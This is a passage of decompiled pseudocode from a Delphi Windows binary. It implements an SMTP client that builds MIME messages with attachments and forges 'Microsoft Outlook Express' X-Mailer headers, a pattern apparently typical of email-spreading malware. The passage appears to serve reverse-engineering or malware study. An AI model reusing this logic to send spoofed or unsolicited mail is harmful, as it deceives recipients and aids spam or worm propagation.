  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_402BDC((_DWORD *)v2[4]);
  sub_402BDC((_DWORD *)v5[2]);
  sub_402BDC((_DWORD *)v5[1]);
  result = sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    result = (_DWORD *)sub_402D2C(v5);
  return result;
}
// 4125CB: variable 'v3' is possibly undefined

//----- (00412604) --------------------------------------------------------
int __usercall sub_412604@<eax>(int a1@<eax>)
{
  _DWORD *v2; // eax
  Classes::TList *v3; // ecx

  v2 = sub_411838(dword_411690, 1);
  return Classes::TList::Add(v3, v2, *(_DWORD **)(a1 + 4));
}
// 412618: variable 'v3' is possibly undefined
// 411690: using guessed type int dword_411690[2];

//----- (00412620) --------------------------------------------------------
void __usercall sub_412620(int a1@<eax>, int a2@<edx>)
{
  int v4; // edi
  int v5; // ebx
  LStr *v6; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-18h] [ebp-1Ch] BYREF
  void *v8; // [esp-14h] [ebp-18h]
  void **v9; // [esp-10h] [ebp-14h]
  int v10; // [esp-Ch] [ebp-10h]
  int v11; // [esp-8h] [ebp-Ch]
  unsigned int v12; // [esp-4h] [ebp-8h]
  int v13; // [esp+0h] [ebp-4h]
  LStr *savedregs; // [esp+4h] [ebp+0h] BYREF

  v13 = 0;
  v9 = (void **)&savedregs;
  v8 = &loc_4126BE;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v7);
  v4 = sub_412604(a1);
  v5 = Classes::TList::Get(v4, *(_DWORD *)(a1 + 4));
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, void **, int, int))(*(_DWORD *)a2 + 104))(
    v7,
    v8,
    v9,
    v10,
    v11);
  sub_411F70(v5, "text");
  __linkproc__ LStrAsg((char **)(v5 + 20), "plain");
  __linkproc__ LStrAsg((char **)(v5 + 24), "message text");
  (*(void (**)(void))(*(_DWORD *)a2 + 28))();
  *(_BYTE *)(v5 + 18) = sub_40F230(v13, *(_BYTE *)(v5 + 19), 1023);
  *(_BYTE *)(v5 + 17) = 2;
  sub_4118CC(v5);
  v6 = savedregs;
  __writefsdword(0, v12);
  savedregs = (LStr *)&loc_4126C5;
  System::__linkproc__ LStrClr(v6);
}

//----- (00412708) --------------------------------------------------------
void __usercall sub_412708(int a1@<eax>, void *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v6; // esi
  int v7; // ebx
  LStr *v8; // ecx
  unsigned int v9[2]; // [esp-14h] [ebp-20h] BYREF
  LStr *v10; // [esp-Ch] [ebp-18h]
  int v11; // [esp-8h] [ebp-14h]
  int v12; // [esp-4h] [ebp-10h]
  char *v13; // [esp+0h] [ebp-Ch] BYREF
  char *v14; // [esp+4h] [ebp-8h] BYREF
  void *v15; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v14 = 0;
  v13 = 0;
  v12 = a3;
  v11 = a5;
  v15 = a2;
  sub_4038D8((int)a2);
  v10 = (LStr *)&savedregs;
  v9[1] = (unsigned int)&loc_4127DC;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v6 = sub_412604(a1);
  v7 = Classes::TList::Get(v6, *(_DWORD *)(a1 + 4));
  TMemoryStream_LoadFromFile(*(void **)(v7 + 40), v15);
  sub_411E58(v7, (char *)v15, v7, a4, v6);
  Sysutils::ExtractFileName((char *)v15, &v13);
  Sysutils::Trim(v13, &v14);
  __linkproc__ LStrAsg((char **)(v7 + 32), v14);
  if ( __linkproc__ LStrPos((char)dword_4127F4, *(char **)(v7 + 32)) )
    System::__linkproc__ LStrCatN((char **)(v7 + 24), 3);
  else
    System::__linkproc__ LStrCat3((BYTE **)(v7 + 24), (BYTE *)"attachment;  filename=", *(char **)(v7 + 32));
  *(_BYTE *)(v7 + 17) = 3;
  sub_4118CC(v7);
  v8 = v10;
  __writefsdword(0, v9[0]);
  v10 = (LStr *)&loc_4127E3;
  System::__linkproc__ LStrArrayClr(v8, 3);
}
// 412708: could not find valid save-restore pair for ebx
// 412708: could not find valid save-restore pair for esi
// 4127F4: using guessed type int dword_4127F4[3];

//----- (00412844) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __usercall sub_412844(int a1@<eax>, struct _EXCEPTION_REGISTRATION_RECORD *a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  int v5; // eax
  int v6; // esi
  int v7; // edi
  LStr *v8; // ecx
  LStr *v9; // ecx
  _DWORD v10[5]; // [esp-18h] [ebp-28h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v11; // [esp-4h] [ebp-14h] BYREF
  BYTE *v12; // [esp+0h] [ebp-10h] BYREF
  BYTE *v13; // [esp+4h] [ebp-Ch] BYREF
  char **v14; // [esp+8h] [ebp-8h]
  char *v15; // [esp+Ch] [ebp-4h] BYREF
  LStr *savedregs; // [esp+10h] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v13 = 0;
  v12 = 0;
  v11 = a2;
  v10[4] = a4;
  v10[3] = a3;
  v10[2] = &savedregs;
  v10[1] = &loc_4129AB;
  v10[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  (*(void (__stdcall **)(_DWORD, void *, LStr **, int, int, struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD, _DWORD))(**(_DWORD **)(a1 + 8) + 64))(
    v10[0],
    &loc_4129AB,
    &savedregs,
    a3,
    a4,
    v11,
    0,
    0);
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 8) == 1 )
  {
    Classes::TList::Get(0, *(_DWORD *)(a1 + 4));
    (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 8))();
  }
  else
  {
    sub_41238C(&v15);
    v5 = *(_DWORD *)(a1 + 4);
    if ( *(_DWORD *)(v5 + 8) - 1 >= 0 )
    {
      v6 = *(_DWORD *)(v5 + 8);
      v7 = 0;
      do
      {
        System::__linkproc__ LStrCat3(&v13, (BYTE *)dword_4129C4, v15);
        (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 52))();
        Classes::TList::Get(v7, *(_DWORD *)(a1 + 4));
        (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 60))();
        ++v7;
        --v6;
      }
      while ( v6 );
    }
    System::__linkproc__ LStrCat3(&v12, (BYTE *)dword_4129C4, v15);
    (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 52))();
    v14 = (char **)sub_411838(dword_411690, 1);
    v13 = (BYTE *)&savedregs;
    v12 = (BYTE *)&loc_412981;
    v11 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v11);
    (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, LStr **))(**(_DWORD **)(a1 + 8) + 104))(
      v11,
      &loc_412981,
      &savedregs);
    sub_411F70((int)v14, "multipart");
    __linkproc__ LStrAsg(v14 + 5, "mixed");
    __linkproc__ LStrAsg(v14 + 6, "Multipart message");
    __linkproc__ LStrAsg(v14 + 7, v15);
    sub_4118CC((int)v14);
    (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 8))();
    __writefsdword(0, (unsigned int)v14);
    savedregs = (LStr *)&loc_412988;
    sub_402BDC(v14);
  }
  v8 = savedregs;
  __writefsdword(0, (unsigned int)v14);
  savedregs = (LStr *)&loc_4129B2;
  System::__linkproc__ LStrArrayClr(v8, 2);
  System::__linkproc__ LStrClr(v9);
}
// 412844: could not find valid save-restore pair for ebx
// 412844: could not find valid save-restore pair for edi
// 412844: could not find valid save-restore pair for esi
// 4128AB: bad sp value at call
// 4128DF: bad sp value at call
// 4129A5: variable 'v9' is possibly undefined
// 411690: using guessed type int dword_411690[2];
// 4129C4: using guessed type int dword_4129C4[3];

//----- (00412A08) --------------------------------------------------------
void __usercall sub_412A08(int a1@<eax>, int a2@<edi>)
{
  unsigned __int64 v3; // st7
  int v4; // eax
  int v5; // esi
  int *v6; // eax
  int v7; // edi
  int *v8; // eax
  LStr *v9; // ecx
  double v10; // [esp+4h] [ebp-4Ch] BYREF
  void *v11; // [esp+Ch] [ebp-44h]
  int *v12; // [esp+10h] [ebp-40h]
  LStr *v13; // [esp+14h] [ebp-3Ch]
  char *v14; // [esp+20h] [ebp-30h] BYREF
  BYTE *v15; // [esp+24h] [ebp-2Ch] BYREF
  char *v16; // [esp+28h] [ebp-28h] BYREF
  char *v17; // [esp+2Ch] [ebp-24h] BYREF
  BYTE *v18; // [esp+30h] [ebp-20h] BYREF
  char *v19; // [esp+34h] [ebp-1Ch] BYREF
  BYTE *v20; // [esp+38h] [ebp-18h] BYREF
  char *v21; // [esp+3Ch] [ebp-14h] BYREF
  BYTE *v22; // [esp+40h] [ebp-10h] BYREF
  char *v23; // [esp+44h] [ebp-Ch] BYREF
  BYTE *v24; // [esp+48h] [ebp-8h] BYREF
  int v25; // [esp+4Ch] [ebp-4h]
  int savedregs; // [esp+50h] [ebp+0h] BYREF

  v12 = &savedregs;
  v11 = &loc_412B7A;
  HIDWORD(v10) = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v10 + 4);
  (*(void (__fastcall **)(const char *, _DWORD, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(
    "X-Mailer: Microsoft Outlook Express 5.50.4133.2400",
    0,
    HIDWORD(v10));
  (*(void (__fastcall **)(const char *, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(
    "X-MIMEOLE: Produced By Microsoft MimeOLE V5.50.4133.2400",
    0);
  (*(void (__fastcall **)(const char *, _DWORD))(**(_DWORD **)(a1 + 8) + 84))("MIME-Version: 1.0", 0);
  *(double *)&v3 = Sysutils::Now();
  sub_411110(&v23, v3, HIDWORD(v3));
  System::__linkproc__ LStrCat3(&v24, (BYTE *)"date: ", v23);
  (*(void (__fastcall **)(BYTE *, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(v24, 0);
  if ( *(_DWORD *)(a1 + 24) )
  {
    sub_412240(*(char **)(a1 + 24), &v21, a2);
    System::__linkproc__ LStrCat3(&v22, (BYTE *)"Organization: ", v21);
    (*(void (__fastcall **)(BYTE *, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(v22, 0);
  }
  if ( *(_DWORD *)(a1 + 20) )
  {
    sub_412240(*(char **)(a1 + 20), &v19, a2);
    System::__linkproc__ LStrCat3(&v20, (BYTE *)"Subject: ", v19);
    (*(void (__fastcall **)(BYTE *, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(v20, 0);
  }
  v4 = (*(int (**)(void))(**(_DWORD **)(a1 + 16) + 20))();
  if ( v4 - 1 >= 0 )
  {
    v5 = v4;
    v25 = 0;
    do
    {
      v6 = *(int **)(a1 + 16);
      v7 = *v6;
      (*(void (__fastcall **)(char **, int))(*v6 + 12))(&v16, v25);
      sub_4122C8(v16, &v17, a1, v7);
      System::__linkproc__ LStrCat3(&v18, (BYTE *)"To: ", v17);
      v8 = *(int **)(a1 + 8);
      a2 = *v8;
      (*(void (__fastcall **)(BYTE *, _DWORD))(*v8 + 84))(v18, 0);
      ++v25;
      --v5;
    }
    while ( v5 );
  }
  sub_4122C8(*(char **)(a1 + 12), &v14, a1, a2);
  System::__linkproc__ LStrCat3(&v15, (BYTE *)"From: ", v14);
  (*(void (__fastcall **)(BYTE *, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(v15, 0);
  v9 = v13;
  __writefsdword(0, (unsigned int)v11);
  v13 = (LStr *)&loc_412B81;
  System::__linkproc__ LStrArrayClr(v9, 11);
}

//----- (00412C80) --------------------------------------------------------
int Finalization_0_7_11()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_412CA5;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E66C;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E66C: using guessed type int dword_41E66C;

//----- (00412CB0) --------------------------------------------------------
void sub_412CB0()
{
  --dword_41E66C;
}
// 41E66C: using guessed type int dword_41E66C;

//----- (00412D28) --------------------------------------------------------
char **__usercall sub_412D28@<eax>(char **a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  char **v3; // edi
  void (***v4)(void); // esi
  char v6; // [esp-10h] [ebp-1Ch]

  if ( a2 )
    a1 = (char **)System::__linkproc__ ClassCreate((int)a1, a2, v6);
  v2 = a2;
  v3 = a1;
  TObject_Create(a1);
  v4 = (void (***)(void))sub_40F908(&off_40F8D4, 1);
  v3[1] = (char *)v4;
  (**v4)();
  v3[2] = (char *)300000;
  __linkproc__ LStrAsg(v3 + 3, "localhost");
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 412D32: variable 'v6' is possibly undefined
// 412D37: variable 'a2' is possibly undefined
// 40F8D4: using guessed type int (*off_40F8D4)();

//----- (00412DA0) --------------------------------------------------------
void __usercall Dxdockcontrol::TdxDockSiteHideBar::~TdxDockSiteHideBar(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v3; // eax
  char v4; // dl
  char v5; // bl
  _DWORD *v6; // esi

  v3 = sub_402D3C(a1, a2);
  v5 = v4;
  v6 = v3;
  sub_402BDC((_DWORD *)v3[1]);
  sub_402BCC(v6, v5 & 0xFC);
  if ( v5 > 0 )
    sub_402D2C(v6);
}
// 412DA7: variable 'v4' is possibly undefined

//----- (00412DD0) --------------------------------------------------------
int __usercall sub_412DD0@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  int v5; // esi
  char *v6; // ecx
  LStr *v7; // ecx
  _DWORD v9[4]; // [esp-18h] [ebp-20h] BYREF
  int v10; // [esp-8h] [ebp-10h]
  int v11; // [esp-4h] [ebp-Ch]
  char *v12; // [esp+0h] [ebp-8h] BYREF
  char *v13; // [esp+4h] [ebp-4h] BYREF
  LStr *savedregs; // [esp+8h] [ebp+0h] BYREF

  v13 = 0;
  v12 = 0;
  v11 = a2;
  v10 = a4;
  v9[3] = a3;
  v9[2] = &savedregs;
  v9[1] = &loc_412E81;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v5 = 0;
  (*(void (__fastcall **)(char **, _DWORD, _DWORD, void *, LStr **, int, int, int))(**(_DWORD **)(a1 + 4) + 24))(
    &v13,
    *(_DWORD *)(a1 + 8),
    v9[0],
    &loc_412E81,
    &savedregs,
    a3,
    v10,
    v11);
  __linkproc__ LStrAsg((char **)(a1 + 20), v13);
  if ( sub_403724((int)v13) >= 3 )
  {
    __linkproc__ LStrCopy(v13, 1, 3, &v12);
    v5 = sub_407058((int)v12, 0, v6);
  }
  while ( __linkproc__ LStrPos((char)&dword_412E9C, v13) == 4 )
  {
    (*(void (__fastcall **)(char **, _DWORD))(**(_DWORD **)(a1 + 4) + 24))(&v13, *(_DWORD *)(a1 + 8));
    if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 40) )
    {
      v5 = 0;
      break;
    }
  }
  *(_DWORD *)(a1 + 16) = v5;
  v7 = savedregs;
  __writefsdword(0, (unsigned int)v12);
  savedregs = (LStr *)&loc_412E88;
  System::__linkproc__ LStrArrayClr(v7, 2);
  return v5;
}
// 412DD0: could not find valid save-restore pair for ebx
// 412DD0: could not find valid save-restore pair for edi
// 412DD0: could not find valid save-restore pair for esi
// 412E2D: variable 'v6' is possibly undefined
// 412E9C: using guessed type int dword_412E9C;

//----- (00412EA0) --------------------------------------------------------
int __usercall sub_412EA0@<eax>(int a1@<eax>, int a2@<edi>)
{
  int v3; // ebx
  LStr *v4; // ecx
  int v5; // edi
  LStr *v6; // ecx
  unsigned int v8[2]; // [esp-18h] [ebp-20h] BYREF
  LStr *v9; // [esp-10h] [ebp-18h]
  BYTE *v10; // [esp+0h] [ebp-8h] BYREF
  char *v11; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  v9 = (LStr *)&savedregs;
  v8[1] = (unsigned int)&loc_412F3F;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v3 = 0;
  sub_40FAD4(*(_DWORD *)(a1 + 4), *(char **)(a1 + 12), "smtp");
  if ( !*(_DWORD *)(*(_DWORD *)(a1 + 4) + 40) && sub_412DD0(a1, 0, a2, a1) == 220 )
  {
    v5 = *(_DWORD *)(a1 + 4);
    sub_410074(v4, &v10);
    System::__linkproc__ LStrCatN(&v11, 3);
    (*(void (**)(void))(*(_DWORD *)v5 + 12))();
    if ( sub_412DD0(a1, 0, v5, a1) == 250 )
      LOBYTE(v3) = 1;
  }
  v6 = v9;
  __writefsdword(0, v8[0]);
  v9 = (LStr *)&loc_412F46;
  System::__linkproc__ LStrArrayClr(v6, 2);
  return v3;
}
// 412EF0: variable 'v4' is possibly undefined

//----- (00412F7C) --------------------------------------------------------
int __usercall sub_412F7C@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>)
{
  (*(void (**)(void))(**(_DWORD **)(a1 + 4) + 12))();
  sub_412DD0(a1, a1, a2, a3);
  return sub_40FAC8(*(_DWORD *)(a1 + 4));
}

//----- (00412FB0) --------------------------------------------------------
int __usercall sub_412FB0@<eax>(int a1@<eax>, char *a2@<edx>, int a3@<edi>)
{
  int v4; // ebx
  LStr *v5; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-Ch] [ebp-1Ch] BYREF
  void *v8; // [esp-8h] [ebp-18h]
  int *v9; // [esp-4h] [ebp-14h]
  LStr *v10; // [esp+0h] [ebp-10h]
  char *v11[2]; // [esp+8h] [ebp-8h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v11[0] = 0;
  v11[1] = a2;
  sub_4038D8((int)a2);
  v9 = &savedregs;
  v8 = &loc_41302F;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v7);
  v4 = 0;
  System::__linkproc__ LStrCatN(v11, 4);
  (*(void (**)(void))(**(_DWORD **)(a1 + 4) + 12))();
  if ( sub_412DD0(a1, 0, a3, a1) == 250 )
    LOBYTE(v4) = 1;
  v5 = v10;
  __writefsdword(0, (unsigned int)v8);
  v10 = (LStr *)&loc_413036;
  System::__linkproc__ LStrArrayClr(v5, 2);
  return v4;
}

//----- (0041306C) --------------------------------------------------------
int __usercall sub_41306C@<eax>(int a1@<eax>, char *a2@<edx>, int a3@<edi>)
{
  int v4; // ebx
  LStr *v5; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-Ch] [ebp-1Ch] BYREF
  void *v8; // [esp-8h] [ebp-18h]
  int *v9; // [esp-4h] [ebp-14h]
  LStr *v10; // [esp+0h] [ebp-10h]
  char *v11[2]; // [esp+8h] [ebp-8h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v11[0] = 0;
  v11[1] = a2;
  sub_4038D8((int)a2);
  v9 = &savedregs;
  v8 = &loc_4130EB;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v7);
  v4 = 0;
  System::__linkproc__ LStrCatN(v11, 4);
  (*(void (**)(void))(**(_DWORD **)(a1 + 4) + 12))();
  if ( sub_412DD0(a1, 0, a3, a1) == 250 )
    LOBYTE(v4) = 1;
  v5 = v10;
  __writefsdword(0, (unsigned int)v8);
  v10 = (LStr *)&loc_4130F2;
  System::__linkproc__ LStrArrayClr(v5, 2);
  return v4;
}

//----- (00413128) --------------------------------------------------------
char __usercall sub_413128@<al>(int a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>)
{
  int v5; // eax
  int v6; // ebx
  LStr *v7; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // [esp-Ch] [ebp-2Ch] BYREF
  void *v10; // [esp-8h] [ebp-28h]
  int *v11; // [esp-4h] [ebp-24h]
  LStr *v12; // [esp+0h] [ebp-20h]
  BYTE *v13; // [esp+Ch] [ebp-14h] BYREF
  BYTE *v14; // [esp+10h] [ebp-10h] BYREF
  int v15; // [esp+14h] [ebp-Ch]
  char v16; // [esp+1Bh] [ebp-5h]
  int *v17; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v13 = 0;
  v14 = 0;
  v17 = (int *)a2;
  v11 = &savedregs;
  v10 = &loc_413212;
  v9 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v9);
  v16 = 0;
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(**(_DWORD **)(a1 + 4) + 12))(v9);
  if ( sub_412DD0(a1, a3, a4, a1) == 354 )
  {
    v5 = (*(int (**)(void))(*v17 + 20))();
    v6 = v5 - 1;
    if ( v5 - 1 >= 0 )
    {
      v6 = v5;
      v15 = 0;
      do
      {
        a4 = *v17;
        (*(void (__fastcall **)(BYTE **, int))(*v17 + 12))(&v14, v15);
        if ( sub_403724((int)v14) >= 1 && *v14 == 46 )
          System::__linkproc__ LStrCat3(&v14, (BYTE *)dword_41323C, (char *)v14);
        System::__linkproc__ LStrCat3(&v13, v14, (char *)dword_413248);
        (*(void (**)(void))(**(_DWORD **)(a1 + 4) + 12))();
        ++v15;
        --v6;
      }
      while ( v6 );
    }
    (*(void (**)(void))(**(_DWORD **)(a1 + 4) + 12))();
    if ( sub_412DD0(a1, v6, a4, a1) == 250 )
      v16 = 1;
  }
  v7 = v12;
  __writefsdword(0, (unsigned int)v10);
  v12 = (LStr *)&loc_413219;
  System::__linkproc__ LStrArrayClr(v7, 2);
  return v16;
}
// 41323C: using guessed type int dword_41323C[3];
// 413248: using guessed type int dword_413248[3];

//----- (00413258) --------------------------------------------------------
char __userpurge sub_413258@<al>(char *a1@<eax>, char *a2@<edx>, char *a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, int a7)
{
  LStr *v7; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // [esp-18h] [ebp-2Ch] BYREF
  void *v10; // [esp-14h] [ebp-28h]
  int *v11; // [esp-10h] [ebp-24h]
  unsigned int v12[2]; // [esp-Ch] [ebp-20h] BYREF
  LStr *v13; // [esp-4h] [ebp-18h]
  char **v14; // [esp+0h] [ebp-14h]
  char v15; // [esp+7h] [ebp-Dh]
  char *v16; // [esp+8h] [ebp-Ch]
  char *v17; // [esp+Ch] [ebp-8h]
  char *v18; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v16 = a3;
  v17 = a2;
  v18 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v17);
  sub_4038D8((int)v16);
  v13 = (LStr *)&savedregs;
  v12[1] = (unsigned int)&loc_413355;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v15 = 0;
  v14 = sub_412D28((char **)dword_412D04, 1);
  v11 = &savedregs;
  v10 = &loc_413333;
  v9 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v9);
  __linkproc__ LStrAsg(v14 + 3, v16);
  if ( (unsigned __int8)sub_412EA0((int)v14, a5)
    && (unsigned __int8)sub_412FB0((int)v14, v18, a5)
    && (unsigned __int8)sub_41306C((int)v14, v17, a5)
    && sub_413128((int)v14, a7, a4, a5) )
  {
    sub_412F7C((int)v14, a5, a6);
    v15 = 1;
    __writefsdword(0, (unsigned int)v9);
    v11 = (int *)&loc_41333A;
    sub_402BDC(v14);
  }
  else
  {
    sub_403038((unsigned int)v9, (int)v10, (int)v11);
  }
  v7 = v13;
  __writefsdword(0, v12[0]);
  v13 = (LStr *)&loc_41335C;
  System::__linkproc__ LStrArrayClr(v7, 3);
  return v15;
}
// 412D04: using guessed type int dword_412D04[2];

//----- (00413368) --------------------------------------------------------
int Finalization_0_7_12()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_41338D;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E670;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E670: using guessed type int dword_41E670;

//----- (00413398) --------------------------------------------------------
void sub_413398()
{
  --dword_41E670;
}
// 41E670: using guessed type int dword_41E670;

//----- (0041376C) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
_DWORD *__usercall Graphics::_16453@<eax>(int a1@<eax>, char a2@<dl>, __int16 a3@<cx>)
{
  char v3; // bl
  _DWORD *v4; // esi
  char v6; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate(a1, a2, v6);
  v3 = a2;
  v4 = (_DWORD *)a1;
  *(_WORD *)(a1 + 32) = a3;
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
  if ( v3 )
    sub_402D34(v4);
  return v4;
}
// 413775: variable 'v6' is possibly undefined
// 41377A: variable 'a2' is possibly undefined
// 41377E: variable 'a3' is possibly undefined

//----- (004137A8) --------------------------------------------------------
void __usercall Graphics::_16454(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v2 + 2));
  if ( v4 > 0 )
    sub_402D2C(v5);
}
// 4137AF: variable 'v3' is possibly undefined

//----- (004137CC) --------------------------------------------------------
void __usercall sub_4137CC(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (004137D8) --------------------------------------------------------
void __usercall sub_4137D8(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00413B3C) --------------------------------------------------------
signed int __usercall sub_413B3C@<eax>(signed int result@<eax>)
{
  if ( result < 0 )
    result = GetSysColor((unsigned __int8)result);
  return result;
}

//----- (00413B4C) --------------------------------------------------------
char __usercall sub_413B4C@<al>(int a1@<eax>, char **a2@<edx>)
{
  return Classes::IntToIdent(a1, a2, (int)&dword_41D858, 41);
}

//----- (00413B5C) --------------------------------------------------------
char __usercall sub_413B5C@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>)
{
  return Classes::IdentToInt(a1, a2, (int)&dword_41D858, 41);
}

//----- (00413D20) --------------------------------------------------------
char __usercall sub_413D20@<al>(int a1@<eax>, char **a2@<edx>)
{
  return Classes::IntToIdent(a1, a2, (int)&dword_41D9A8, 17);
}

//----- (00413D30) --------------------------------------------------------
char __usercall sub_413D30@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>)
{
  return Classes::IdentToInt(a1, a2, (int)&dword_41D9A8, 17);
}

//----- (00413D40) --------------------------------------------------------
int __usercall Graphics::TFont::GetHandle@<eax>(int a1@<eax>)
{
  char v3; // al
  HFONT v4; // eax
  int v5; // ebx
  LStr *v6; // ecx
  unsigned int v8[2]; // [esp-18h] [ebp-68h] BYREF
  int *v9; // [esp-10h] [ebp-60h]
  unsigned int v10[2]; // [esp-Ch] [ebp-5Ch] BYREF
  LStr *v11; // [esp-4h] [ebp-54h]
  BYTE *v12; // [esp+4h] [ebp-4Ch] BYREF
  BYTE *v13; // [esp+8h] [ebp-48h] BYREF
  BYTE *v14; // [esp+Ch] [ebp-44h] BYREF
  LOGFONTA lf; // [esp+10h] [ebp-40h] BYREF
  int v16; // [esp+4Ch] [ebp-4h]
  int savedregs; // [esp+50h] [ebp+0h] BYREF

  v12 = 0;
  v13 = 0;
  v14 = 0;
  v11 = (LStr *)&savedregs;
  v10[1] = (unsigned int)&loc_413EC9;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v16 = *(_DWORD *)(a1 + 16);
  if ( !*(_DWORD *)(v16 + 8) )
  {
    sub_4137CC(dword_41E6C0);
    v9 = &savedregs;
    v8[1] = (unsigned int)&loc_413EA1;
    v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v8);
    if ( !*(_DWORD *)(v16 + 8) )
    {
      lf.lfHeight = *(_DWORD *)(v16 + 20);
      lf.lfWidth = 0;
      lf.lfEscapement = 0;
      lf.lfOrientation = 0;
      if ( (*(_BYTE *)(v16 + 25) & 1) != 0 )
        lf.lfWeight = 700;
      else
        lf.lfWeight = 400;
      lf.lfItalic = (*(_BYTE *)(v16 + 25) & 2) != 0;
      lf.lfUnderline = (*(_BYTE *)(v16 + 25) & 4) != 0;
      lf.lfStrikeOut = (*(_BYTE *)(v16 + 25) & 8) != 0;
      lf.lfCharSet = *(_BYTE *)(v16 + 26);
      sub_4036EC(&v14, (unsigned __int8 *)(v16 + 27));
      if ( DumbItDownFor95((char *)v14, "Default") )
      {
        sub_4036EC(&v12, (unsigned __int8 *)(v16 + 27));
        StrPCopy(lf.lfFaceName, (char *)v12);
      }
      else
      {
